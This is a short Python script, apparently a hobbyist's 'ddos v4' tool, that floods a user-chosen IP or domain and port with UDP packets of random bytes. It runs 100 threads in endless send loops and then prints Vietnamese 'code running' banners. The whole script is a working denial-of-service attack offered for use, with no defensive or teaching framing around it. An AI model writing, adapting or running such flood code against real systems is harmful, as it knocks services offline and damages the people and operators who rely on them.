import os
import socket
import threading
import time 

def attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(124)  # Generate random data
    while True:
        sock.sendto(bytes, (target_ip, target_port))

def main():
    target = input("Enter target IP or domain: ")
    target_port = int(input("Enter target port: "))
    
    try:
        target_ip = socket.gethostbyname(target)  # Resolve domain to IP
    except socket.gaierror:
        print("Invalid domain or IP.")
        return

    for i in range(100):  # Number of threads
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    main()  

message = "hello ddos v4 update Nov 16 06:00!"
print(message)

message = "CODE CHAY THANH CONG!"
print(message)

text = "CODE DANG CHAY ... "
width = 2
scroll = " " * width + text

while True:
    for i in range(len(scroll)):
        print(scroll[i:], end="\r", flush=True)
        time.sleep(1.5)  # Adjust speed here

